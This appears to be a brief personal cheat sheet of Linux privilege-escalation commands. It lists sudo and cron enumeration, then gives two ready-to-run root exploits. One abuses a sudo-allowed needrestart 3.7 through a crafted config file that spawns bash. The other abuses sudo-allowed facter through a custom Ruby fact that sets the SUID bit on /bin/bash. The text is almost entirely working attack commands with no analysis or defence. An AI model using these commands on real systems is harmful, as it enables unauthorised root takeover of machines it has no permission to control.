##simple commands
```
ls -la
sudo -su
sudo -l
crontab -l
```
##using /bin/bash 
```
sudo -u user /bin/bash
```
##needrestart v3.7
```
echo 'system("/bin/bash");' > /tmp/root.sh

Now run needrestart, with sudo, using using that configuration file as an argument:

sudo /usr/sbin/needrestart -c /tmp/root.sh
```

##/usr/bin/facter
```
mkdir -p /tmp/exploit_facts

cd /tmp/exploit_facts/

cat > /tmp/exploit_facts/exploit.rb << 'EOF'
#!/usr/bin/env ruby
puts "custom_fact=exploited"
system("chmod +s /bin/bash")
EOF

sudo /usr/bin/facter --custom-dir=/tmp/exploit_facts/ x

bash -p
```

